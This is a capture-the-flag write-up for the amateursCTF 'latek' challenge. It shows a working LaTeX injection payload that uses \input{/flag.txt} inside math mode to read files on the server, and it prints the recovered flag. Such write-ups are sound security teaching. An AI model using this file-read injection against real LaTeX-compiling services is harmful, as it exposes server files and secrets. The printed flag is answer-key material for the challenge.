# latek

## problem

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/aebb79cd-4a70-4c43-acec-933a88fa5a77)

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/bad4708d-656d-4e57-b3d2-470a0a6b2a58)

## solution

first of all, why tf is it pronounced "latek"??, who decided it rolled off the tongue better than "latex"??????? angry

we can try to use the `\input{<path>}` to inject any file on disk to the latex document

however, there is an error so we cannot get the full flag:

![image](https://github.com/quasar098/ctf-writeups/assets/70716985/9c277e94-004b-4e7c-8403-ae15ff9db5a2)

we can surround the input command with `$` and it works

total payload:

```latex
\documentclass{article}
\begin{document}
$\input{/flag.txt}$
\end{document}
```
![image](https://github.com/quasar098/ctf-writeups/assets/70716985/553638ab-779f-4dc3-ae20-bc62a7a0c14b)

i know that `_` before a character means it is subscripted, so we can do the reverse to get the flag

`amateursCTF{th3_l0w_budg3t_and_n0_1nstanc3ing_caus3d_us_t0_n0t_all0w_rc3_sadly}`

i'm not quite sure what rc3 is. someone let me know if you figure it out
